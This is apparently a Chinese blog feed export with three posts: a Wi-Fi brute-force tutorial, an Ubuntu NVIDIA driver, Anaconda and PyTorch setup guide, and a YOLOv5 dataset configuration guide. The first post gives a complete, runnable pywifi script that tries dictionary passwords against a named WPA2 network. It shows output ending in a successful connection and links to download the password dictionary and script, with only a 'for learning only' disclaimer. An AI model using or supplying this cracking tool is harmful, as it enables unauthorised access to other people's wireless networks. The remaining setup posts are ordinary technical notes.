<h2 id="局域网WiFi暴力破解"><a href="#局域网WiFi暴力破解" class="headerlink" title="局域网WiFi暴力破解"></a>局域网WiFi暴力破解</h2><p>首先我下载了csdn的一个资源<a href="https://download.csdn.net/download/zero_first/10248837?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162199281816780262574303%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=162199281816780262574303&amp;biz_id=1&amp;utm_medium=distribute.pc_search_result.none-task-download-2~download~sobaiduend~default-1-10248837.pc_v2_rank_dl_v1&amp;utm_term=wifi%E5%AD%97%E5%85%B8&amp;spm=1018.2226.3001.4451">常用破WIFI字典(很全)</a>.或者你自行寻找wifi字典位置。</p>
<h3 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h3><pre class="line-numbers language-none"><code class="language-none">import pywifi
from pywifi import *
import time

SSID&#x3D;&#39;989&#39;
pathfile &#x3D; &quot;E:&#x2F;常用wifi字典.txt&quot;


def CrackWifi(password):
    wifi &#x3D; pywifi.PyWiFi()
    iface &#x3D; wifi.interfaces()[0] # 取一个无限网卡
    # 是否成功的标志
    isok &#x3D; True

    if(iface.status()!&#x3D;const.IFACE_CONNECTED):
      profile &#x3D; pywifi.Profile()
      profile.ssid &#x3D; SSID
      profile.auth &#x3D; const.AUTH_ALG_OPEN     #需要秘密
      profile.akm.append(const.AKM_TYPE_WPA2PSK) #加密类型
      profile.cipher &#x3D; const.CIPHER_TYPE_CCMP   #加密单元
      #profile.key &#x3D; &#39;123456789&#39;         #在此输入你的wifi密码
      profile.key &#x3D; password
      #time.sleep(3)
      wifi &#x3D; pywifi.PyWiFi()
      iface &#x3D; wifi.interfaces()[0] # 取一个无限网卡
      profile &#x3D; iface.add_network_profile(profile)
      iface.connect(profile)
      time.sleep(3)    #程序休眠时间3秒；如果没有此句，则会打印连接失败，因为它需要一定的检测时间
      if iface.status()&#x3D;&#x3D;const.IFACE_CONNECTED:
        print(&quot;连接成功！！！&quot;)
      else:
        print(&quot;连接失败！！！&quot;)
        isok&#x3D;False
      return isok
    else:
      print(&quot;已经连接网络&quot;)
      return isok
#CrackWifi()
def PasswordFile():
    global pathfile
    files&#x3D;open(pathfile,&#39;r&#39;)
    while True:
        fp&#x3D;files.readline()
        if not fp:
            break
        wifipass &#x3D; fp[:-1]
        print(wifipass)
        if CrackWifi(wifipass):
            break
while True:
    PasswordFile()
    time.sleep(5)


<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="输出结果"><a href="#输出结果" class="headerlink" title="输出结果"></a>输出结果</h3><pre class="line-numbers language-none"><code class="language-none">12345678
连接失败！！！
88888888
连接失败！！！
123456789
连接失败！！！
1234567890
连接失败！！！
11111111
连接失败！！！
1111111111
链接成功
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该方法就是不断的输入密码依次来破解wifi的密码，但这要看其是否为常用的wifi密码，是否在wifi字典中，撞库去获取正确密码，本代码仅限于学习参考。</p>
<p>运行上述代码即可。当然我也附带了wifi密码库给你们节约了50个积分。</p>
<ul>
<li>字典：<a href="https://www.codekp.cn/download/img/wifi密码库/常用wifi字典.txt">常用破WIFI字典</a></li>
<li>源码：<a href="https://www.codekp.cn/download/img/wifi密码库/暴力wifi破解.py">暴力wifi破解.py</a></li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu_NVIDIA30xx，开发环境显卡安装</title>
    <url>/2021/10/22/ubuntu-NVIDIA30xx%E6%98%BE%E5%8D%A1%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Ubuntu系统安装NVIDIARTX30xx显卡驱动，开发环境安装"><a href="#Ubuntu系统安装NVIDIARTX30xx显卡驱动，开发环境安装" class="headerlink" title="Ubuntu系统安装NVIDIARTX30xx显卡驱动，开发环境安装"></a>Ubuntu系统安装NVIDIARTX30xx显卡驱动，开发环境安装</h1><h2 id="ubuntu系统安装"><a href="#ubuntu系统安装" class="headerlink" title="ubuntu系统安装"></a>ubuntu系统安装</h2><h3 id="ubuntu系统尝试"><a href="#ubuntu系统尝试" class="headerlink" title="ubuntu系统尝试"></a>ubuntu系统尝试</h3><blockquote>
<p>在尝试过ubuntu20.04和18.04以后发现这两个系统均无法成果安装NVIDIA30xx系列显卡,可能是内核版本不行，最终使用ubuntu21.04成功安装NVIDIA30xx显卡。</p>
<h3 id="系统盘制作"><a href="#系统盘制作" class="headerlink" title="系统盘制作"></a>系统盘制作</h3><ul>
<li>在ubuntu官网安装系统镜像</li>
<li>使用Rufus制作启动盘<h3 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a>安装系统</h3></li>
<li>该过程过于简单略过（磁盘分配随意）</li>
</ul>
</blockquote>
<h2 id="显卡驱动安装预操作"><a href="#显卡驱动安装预操作" class="headerlink" title="显卡驱动安装预操作"></a>显卡驱动安装预操作</h2><h3 id="进入BIOS关闭安全启动"><a href="#进入BIOS关闭安全启动" class="headerlink" title="进入BIOS关闭安全启动"></a>进入BIOS关闭安全启动</h3><p><img src="https://www.codekp.cn/download/img/ubuntu/secureboot.png" alt=""><br>进入bios关闭安全启动，disable掉安全启动</p>
<h3 id="关闭windows-bitlocker"><a href="#关闭windows-bitlocker" class="headerlink" title="关闭windows-bitlocker"></a>关闭windows-bitlocker</h3><p><img src="https://www.codekp.cn/download/img/ubuntu/bitlocker.png" alt=""><br>进入控制面板关闭磁盘锁</p>
<h2 id="显卡驱动安装（RTX30xx显卡）"><a href="#显卡驱动安装（RTX30xx显卡）" class="headerlink" title="显卡驱动安装（RTX30xx显卡）"></a>显卡驱动安装（RTX30xx显卡）</h2><h3 id="安装驱动"><a href="#安装驱动" class="headerlink" title="安装驱动"></a>安装驱动</h3><ul>
<li>下载NVIDIA驱动程序，RTX3060对应版本为370约，240M<br>驱动对应搜索如下：<br><img src="https://www.codekp.cn/download/img/ubuntu/NVIDIA1.png" alt=""><h3 id="重要环境"><a href="#重要环境" class="headerlink" title="重要环境"></a>重要环境</h3>为了安装成果本人建议，使用8月10号的驱动版本，个人建议，9月10号貌似安装不上<br><img src="https://www.codekp.cn/download/img/ubuntu/NVIDIA2.png" alt=""></li>
</ul>
<p>将 该 .run file 拷贝到 /home 下， 以方便获取并安装</p>
<h2 id="Ubuntu图形界面配置"><a href="#Ubuntu图形界面配置" class="headerlink" title="Ubuntu图形界面配置"></a>Ubuntu图形界面配置</h2><p>不要再ubuntu上插任何显示器。</p>
<h3 id="禁用nouveau，禁用掉集成显卡驱动"><a href="#禁用nouveau，禁用掉集成显卡驱动" class="headerlink" title="禁用nouveau，禁用掉集成显卡驱动"></a>禁用nouveau，禁用掉集成显卡驱动</h3><pre class="line-numbers language-none"><code class="language-none">sudo nano &#x2F;etc&#x2F;modprobe.d&#x2F;blacklist.conf <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol>
<li>在文件最后一行加入<pre class="line-numbers language-none"><code class="language-none">blacklist nouveau
options nouveau modeset&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
<li>更新内核<pre class="line-numbers language-none"><code class="language-none">sudo update-initramfs -u <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li>重启系统<pre class="line-numbers language-none"><code class="language-none">sudo reboot<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li>重启后验证nouveau是否被成果禁用<pre class="line-numbers language-none"><code class="language-none">lsmod | grep nouveau<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
无输出则为禁用成果</li>
</ol>
<h3 id="关闭lightdm"><a href="#关闭lightdm" class="headerlink" title="关闭lightdm"></a>关闭lightdm</h3><pre class="line-numbers language-none"><code class="language-none">sudo service lightdm stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>此时进入黑窗界面<br><pre class="line-numbers language-none"><code class="language-none">Ctrl+Alt+F1 or  Ctrl+Alt+F6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>登录账户</p>
<ul>
<li>进入下一步安装显卡驱动</li>
</ul>
<h2 id="显卡驱动安装"><a href="#显卡驱动安装" class="headerlink" title="显卡驱动安装"></a>显卡驱动安装</h2><h3 id="找到之前在-home-中保存的-NVIDIA-run-文件"><a href="#找到之前在-home-中保存的-NVIDIA-run-文件" class="headerlink" title="找到之前在 /home 中保存的 NVIDIA-*.run 文件"></a>找到之前在 /home 中保存的 NVIDIA-*.run 文件</h3><pre class="line-numbers language-none"><code class="language-none">sudo bash NVIDIA-*.run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h3><ul>
<li>这里很关键,如果前面配置都完成了，基本是一路确定，其中 32-bit 库 选择 No， restart X service 选择 Yes </li>
<li>补充，最好还是一个问题一个问题去网上搜别人的选项，不要选错了！！！</li>
</ul>
<h3 id="显卡驱动验证-："><a href="#显卡驱动验证-：" class="headerlink" title="显卡驱动验证 ："></a>显卡驱动验证 ：</h3><pre class="line-numbers language-none"><code class="language-none">nvidia-smi


+-----------------------------------------------------------------------------+
| NVIDIA-SMI 471.96       Driver Version: 471.96       CUDA Version: 11.4     |
|-------------------------------+----------------------+----------------------+
| GPU  Name            TCC&#x2F;WDDM | Bus-Id        Disp.A | Volatile Uncorr. ECC |
| Fan  Temp  Perf  Pwr:Usage&#x2F;Cap|         Memory-Usage | GPU-Util  Compute M. |
|                               |                      |               MIG M. |
|&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;|
|   0  NVIDIA GeForce ... WDDM  | 00000000:01:00.0  On |                  N&#x2F;A |
|  0%   42C    P8    13W &#x2F; 170W |    819MiB &#x2F; 12288MiB |      0%      Default |
|                               |                      |                  N&#x2F;A |
+-------------------------------+----------------------+----------------------+

+-----------------------------------------------------------------------------+
| Processes:                                                                  |
|  GPU   GI   CI        PID   Type   Process name                  GPU Memory |
|        ID   ID                                                   Usage      |
|&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;|
|    0   N&#x2F;A  N&#x2F;A      1192    C+G   Insufficient Permissions        N&#x2F;A      |
|    0   N&#x2F;A  N&#x2F;A      5292    C+G   ...wekyb3d8bbwe\Video.UI.exe    N&#x2F;A      |
|    0   N&#x2F;A  N&#x2F;A      6620    C+G   ...ge\Application\msedge.exe    N&#x2F;A      |
|    0   N&#x2F;A  N&#x2F;A      6808    C+G   C:\Windows\explorer.exe         N&#x2F;A      |
|    0   N&#x2F;A  N&#x2F;A      8560    C+G   ...5n1h2txyewy\SearchApp.exe    N&#x2F;A      |
|    0   N&#x2F;A  N&#x2F;A      8724    C+G   ...nputApp\TextInputHost.exe    N&#x2F;A      |
|    0   N&#x2F;A  N&#x2F;A      9264    C+G   ...y\ShellExperienceHost.exe    N&#x2F;A      |
|    0   N&#x2F;A  N&#x2F;A     13340    C+G   ...icrosoft VS Code\Code.exe    N&#x2F;A      |
|    0   N&#x2F;A  N&#x2F;A     13728    C+G   ...e\root\Office16\VISIO.EXE    N&#x2F;A      |
|    0   N&#x2F;A  N&#x2F;A     14816    C+G   ...5n1h2txyewy\SearchApp.exe    N&#x2F;A      |
+-----------------------------------------------------------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如过正常输出，则安装完成。</p>
<h3 id="黑窗解决方案"><a href="#黑窗解决方案" class="headerlink" title="黑窗解决方案"></a>黑窗解决方案</h3><p>最后最重要的一步，安装后重启系统，会发现进不了图形界面了，只能进入黑窗。<br>这是由于 Ubuntu 21.04 和 NVIDIA RTX 3080 Ti 驱动 略微不兼容导致的。（Ubuntu 18.04 以及 20.04 更别提了，完全不兼容）<br>解决方法：<br>通过ubuntu高级选项，进入ubuntu修复系统。<br><pre class="line-numbers language-none"><code class="language-none">sudo rm &#x2F;etc&#x2F;X11&#x2F;xorg.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>重启后即可进入图形界面</p>
<p>该问题我只在RTX3060上遇到，RTX3050Ti未遇到黑窗问题。</p>
<h2 id="Anconda-pytorch-linux"><a href="#Anconda-pytorch-linux" class="headerlink" title="Anconda_pytorch_linux"></a>Anconda_pytorch_linux</h2><h3 id="Anaconda-下载"><a href="#Anaconda-下载" class="headerlink" title="Anaconda 下载"></a>Anaconda 下载</h3><p>Anaconda官网下载地址<a href="https://www.anaconda.com/products/individual">https://www.anaconda.com/products/individual</a>下载最新的即可，下载很慢<br>可以使用Anaconda清华镜像源进行下载<a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/">https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/</a>下载最新的即可</p>
<p>我下载的为<code>Anaconda3-2021.04-Linux-x86_64.sh    539.9 MiB    2021-05-11 04:17</code></p>
<h3 id="anaconda安装"><a href="#anaconda安装" class="headerlink" title="anaconda安装"></a>anaconda安装</h3><p>进入到下载目录，然后bash命令，如：</p>
<p><code>bash Anaconda3-2018.12-Linux-x86_64.sh</code></p>
<p>一路enter就行</p>
<h4 id="环境变量配置"><a href="#环境变量配置" class="headerlink" title="环境变量配置"></a>环境变量配置</h4><pre class="line-numbers language-none"><code class="language-none"> vi ~&#x2F;.bashrc
在最后一行加入
 export PATH&#x3D;&quot;&#x2F;home&#x2F;Sweeneys&#x2F;anaconda3&#x2F;bin:$PATH&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><code>/home/Sweeneys/anaconda3</code>这个地方改为你自己的安装路径pwd</p>
<h4 id="安装验证"><a href="#安装验证" class="headerlink" title="安装验证"></a>安装验证</h4><pre class="line-numbers language-none"><code class="language-none">conda --version
conda 4.10.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="pytorch"><a href="#pytorch" class="headerlink" title="pytorch"></a>pytorch</h3><p>首先创建一个独立的环境，版本可自己选择<br><pre class="line-numbers language-none"><code class="language-none">conda create -n pytorch python&#x3D;3.8.5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>如果弹出提示，yes即可</p>
<h3 id="验证操作"><a href="#验证操作" class="headerlink" title="验证操作"></a>验证操作</h3><pre class="line-numbers language-none"><code class="language-none">conda info --envs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none"># conda environments:
#
base                  *  D:\Users\vadmin\anaconda3
pytorch                  D:\Users\vadmin\anaconda3\envs\pytorch
pytorchgpu               D:\Users\vadmin\anaconda3\envs\pytorchgpu
tensorflow1              D:\Users\vadmin\anaconda3\envs\tensorflow1
tf_hjz                   D:\Users\vadmin\anaconda3\envs\tf_hjz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="安装pytorch"><a href="#安装pytorch" class="headerlink" title="安装pytorch"></a>安装pytorch</h3><p>找到pytorch官网<a href="https://pytorch.org/">https://pytorch.org/</a></p>
<p><img src="https://www.codekp.cn/download/img/ubuntu/pytorch.png" alt=""></p>
<p>在anaconda 环境中加入<br><pre class="line-numbers language-none"><code class="language-none">conda install pytorch torchvision torchaudio cudatoolkit&#x3D;11.3 -c pytorch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>果断输入y，之后就是漫长的等待。或者去休息吧，慢慢等着。看看剧啥的，等着它慢慢下吧。如果你的并不慢，恭喜恭喜。</p>
<h3 id="成功性验证"><a href="#成功性验证" class="headerlink" title="成功性验证"></a>成功性验证</h3><ol>
<li>在命令行左边为 pytorch 环境中，输入 python</li>
<li>之后，输入 import torch，如果没有报错，意味着 PyTorch 已经顺利安装了</li>
<li>接下来，输入 torch.cuda.is_available，如果是 True，意味着你可以使用 GPU，如果是 False，意味着只能使用CPU。</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">(pytorch) C:\Users\vadmin&gt;python
Python 3.6.13 |Anaconda, Inc.| (default, Mar 16 2021, 11:37:27) [MSC v.1916 64 bit (AMD64)] on win32
Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.
&gt;&gt;&gt; import torch
&gt;&gt;&gt; torch.cuda.is_available
&lt;function is_available at 0x00000168FE9951E0&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>NVIDIA30xx</tag>
      </tags>
  </entry>
  <entry>
    <title>Yolo5使用</title>
    <url>/2021/07/19/yolo5%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Yolov5-训练and识别"><a href="#Yolov5-训练and识别" class="headerlink" title="Yolov5_训练and识别"></a>Yolov5_训练and识别</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>python 3.8.5</p>
<h3 id="安装conda"><a href="#安装conda" class="headerlink" title="安装conda"></a>安装conda</h3><pre class="line-numbers language-none"><code class="language-none">wget -c https:&#x2F;&#x2F;repo.continuum.io&#x2F;miniconda&#x2F;Miniconda3-latest-Linux-x86_64.sh
chmod 777 Miniconda3-latest-Linux-x86_64.sh
sh Miniconda3-latest-Linux-x86_64.sh
vim ~&#x2F;.bashrc
export  PATH&#x3D;&quot;&#x2F;home&#x2F;gaoxiang&#x2F;miniconda3&#x2F;bin:&quot;$PATH
source ~&#x2F;.bashrc


添加源
conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;free&#x2F;
conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;pkgs&#x2F;main&#x2F;
conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;conda-forge&#x2F;
conda config --add channels https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;anaconda&#x2F;cloud&#x2F;bioconda&#x2F;
conda config --set show_channel_urls yes 
conda config --get channels

conda env list

conda create -n name python&#x3D;3.8.5

pip install -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple opencv-python

pip install --upgrade -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple torch torchvision

pip install numpy scipy seaborn
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p>如果还有没有安装上的请继续安装。</p>
<h3 id="github源"><a href="#github源" class="headerlink" title="github源"></a>github源</h3><p>主要参考的是官方yolov5.<br><code>https://github.com/ultralytics/yolov5</code></p>
</blockquote>
<h2 id="训练自己的任务"><a href="#训练自己的任务" class="headerlink" title="训练自己的任务"></a>训练自己的任务</h2><h3 id="训练前的配置"><a href="#训练前的配置" class="headerlink" title="训练前的配置"></a>训练前的配置</h3><p>主要采用COCO数据集，配置好上述的环境后，就可以进行使用。</p>
<p>首先更改你的dataset.yaml文件</p>
<pre class="line-numbers language-none"><code class="language-none"># Train&#x2F;val&#x2F;test sets as 1) dir: path&#x2F;to&#x2F;imgs, 2) file: path&#x2F;to&#x2F;imgs.txt, or 3) list: [path&#x2F;to&#x2F;imgs1, path&#x2F;to&#x2F;imgs2, ..]
path: &#x2F;home&#x2F;wkp&#x2F;yolov5-master  # 数据集目录
train: images  # 图片路径
val: images  # 图片路径
test:  &#x2F;home&#x2F;wkp&#x2F;yolov5-master&#x2F;test # 测试图像，非必填

# Classes
nc: 201  # number of classes
names: [&#39;pl80&#39;, &#39;w9&#39;, &#39;p6&#39;, &#39;ph4.2&#39;, &#39;i8&#39;, &#39;w14&#39;, &#39;w33&#39;, &#39;pa13&#39;, &#39;im&#39;, &#39;w58&#39;, &#39;pl90&#39;, &#39;il70&#39;, &#39;p5&#39;, &#39;pm55&#39;, &#39;pl60&#39;, &#39;ip&#39;, &#39;p11&#39;, &#39;pdd&#39;, &#39;wc&#39;, &#39;i2r&#39;, &#39;w30&#39;, &#39;pmr&#39;, &#39;p23&#39;, &#39;pl15&#39;, &#39;pm10&#39;, &#39;pss&#39;, &#39;w1&#39;, &#39;p4&#39;, &#39;w38&#39;, &#39;w50&#39;, &#39;w34&#39;, &#39;pw3.5&#39;, &#39;iz&#39;, &#39;w39&#39;, &#39;w11&#39;, &#39;p1n&#39;, &#39;pr70&#39;, &#39;pd&#39;, &#39;pnl&#39;, &#39;pg&#39;, &#39;ph5.3&#39;, &#39;w66&#39;, &#39;il80&#39;, &#39;pb&#39;, &#39;pbm&#39;, &#39;pm5&#39;, &#39;w24&#39;, &#39;w67&#39;, &#39;w49&#39;, &#39;pm40&#39;, &#39;ph4&#39;, &#39;w45&#39;, &#39;i4&#39;, &#39;w37&#39;, &#39;ph2.6&#39;, &#39;pl70&#39;, &#39;ph5.5&#39;, &#39;i14&#39;, &#39;i11&#39;, &#39;p7&#39;, &#39;p29&#39;, &#39;pne&#39;, &#39;pr60&#39;, &#39;pm13&#39;, &#39;ph4.5&#39;, &#39;p12&#39;, &#39;p3&#39;, &#39;w40&#39;, &#39;pl5&#39;, &#39;w13&#39;, &#39;pr10&#39;, &#39;p14&#39;, &#39;i4l&#39;, &#39;pr30&#39;, &#39;pw4.2&#39;, &#39;w16&#39;, &#39;p17&#39;, &#39;ph3&#39;, &#39;i9&#39;, &#39;w15&#39;, &#39;w35&#39;, &#39;pa8&#39;, &#39;pt&#39;, &#39;pr45&#39;, &#39;w17&#39;, &#39;pl30&#39;, &#39;pcs&#39;, &#39;pctl&#39;, &#39;pr50&#39;, &#39;ph4.4&#39;, &#39;pm46&#39;, &#39;pm35&#39;, &#39;i15&#39;, &#39;pa12&#39;, &#39;pclr&#39;, &#39;i1&#39;, &#39;pcd&#39;, &#39;pbp&#39;, &#39;pcr&#39;, &#39;w28&#39;, &#39;ps&#39;, &#39;pm8&#39;, &#39;w18&#39;, &#39;w2&#39;, &#39;w52&#39;, &#39;ph2.9&#39;, &#39;ph1.8&#39;, &#39;pe&#39;, &#39;p20&#39;, &#39;w36&#39;, &#39;p10&#39;, &#39;pn&#39;, &#39;pa14&#39;, &#39;w54&#39;, &#39;ph3.2&#39;, &#39;p2&#39;, &#39;ph2.5&#39;, &#39;w62&#39;, &#39;w55&#39;, &#39;pw3&#39;, &#39;pw4.5&#39;, &#39;i12&#39;, &#39;ph4.3&#39;, &#39;phclr&#39;, &#39;i10&#39;, &#39;pr5&#39;, &#39;i13&#39;, &#39;w10&#39;, &#39;p26&#39;, &#39;w26&#39;, &#39;p8&#39;, &#39;w5&#39;, &#39;w42&#39;, &#39;il50&#39;, &#39;p13&#39;, &#39;pr40&#39;, &#39;p25&#39;, &#39;w41&#39;, &#39;pl20&#39;, &#39;ph4.8&#39;, &#39;pnlc&#39;, &#39;ph3.3&#39;, &#39;w29&#39;, &#39;ph2.1&#39;, &#39;w53&#39;, &#39;pm30&#39;, &#39;p24&#39;, &#39;p21&#39;, &#39;pl40&#39;, &#39;w27&#39;, &#39;pmb&#39;, &#39;pc&#39;, &#39;i6&#39;, &#39;pr20&#39;, &#39;p18&#39;, &#39;ph3.8&#39;, &#39;pm50&#39;, &#39;pm25&#39;, &#39;i2&#39;, &#39;w22&#39;, &#39;w47&#39;, &#39;w56&#39;, &#39;pl120&#39;, &#39;ph2.8&#39;, &#39;i7&#39;, &#39;w12&#39;, &#39;pm1.5&#39;, &#39;pm2.5&#39;, &#39;w32&#39;, &#39;pm15&#39;, &#39;ph5&#39;, &#39;w19&#39;, &#39;pw3.2&#39;, &#39;pw2.5&#39;, &#39;pl10&#39;, &#39;il60&#39;, &#39;w57&#39;, &#39;w48&#39;, &#39;w60&#39;, &#39;pl100&#39;, &#39;pr80&#39;, &#39;p16&#39;, &#39;pl110&#39;, &#39;w59&#39;, &#39;w64&#39;, &#39;w20&#39;, &#39;ph2&#39;, &#39;p9&#39;, &#39;il100&#39;, &#39;w31&#39;, &#39;w65&#39;, &#39;ph2.4&#39;, &#39;pr100&#39;, &#39;p19&#39;, &#39;ph3.5&#39;, &#39;pa10&#39;, &#39;pcl&#39;, &#39;pl35&#39;, &#39;p15&#39;, &#39;w7&#39;, &#39;pa6&#39;, &#39;phcs&#39;, &#39;w43&#39;, &#39;p28&#39;, &#39;w6&#39;, &#39;w3&#39;, &#39;w25&#39;, &#39;pl25&#39;, &#39;il110&#39;, &#39;p1&#39;, &#39;w46&#39;, &#39;pn-2&#39;, &#39;w51&#39;, &#39;w44&#39;, &#39;w63&#39;, &#39;w23&#39;, &#39;pm20&#39;, &#39;w8&#39;, &#39;pmblr&#39;, &#39;w4&#39;, &#39;i5&#39;, &#39;il90&#39;, &#39;w21&#39;, &#39;p27&#39;, &#39;pl50&#39;, &#39;pl65&#39;, &#39;w61&#39;, &#39;ph2.2&#39;, &#39;pm2&#39;, &#39;i3&#39;, &#39;pa18&#39;, &#39;pw4&#39;] #数据类
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>自己的数据按照上述的路径进行修改。</p>
<h3 id="打标签"><a href="#打标签" class="headerlink" title="打标签"></a>打标签</h3><p>图像和标签分别放在 labels和images两个目录下，可以通过<a href="https://www.makesense.ai/">makesense.ai</a>打标签，但更推荐开源标签软件-LabelImg。</p>
<p>将标签导出为YOLO 格式，<em>.txt每个图像一个文件（如果图像中没有对象，则不需要</em>.txt文件）。该*.txt文件规格有：</p>
<ul>
<li>每个对象一行</li>
<li>每一行都是class x_center y_center width height格式。</li>
<li>框坐标必须采用标准化 xywh格式（从 0 - 1）。如果您的箱子以像素为单位，划分x_center并width通过图像宽度，y_center并height通过图像高度。</li>
<li>类号是零索引的（从 0 开始）。</li>
</ul>
<p><img src="https://www.codekp.cn/download/img/标签/label.png" alt=""><br>如图所示，分别代表了分类0的矩形的x\y宽高。</p>
<h3 id="数据集整理"><a href="#数据集整理" class="headerlink" title="数据集整理"></a>数据集整理</h3><p>将自己的数据集按照以上的方式进行一个整理，然后进行学习训练。</p>
<p>例如：</p>
<pre class="line-numbers language-none"><code class="language-none">数据集&#x2F;iamges&#x2F;im0.jpg   #图像
数据集&#x2F;labels&#x2F;im0.txt   #标签<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="https://www.codekp.cn/download/img/标签/root.png" alt=""></p>
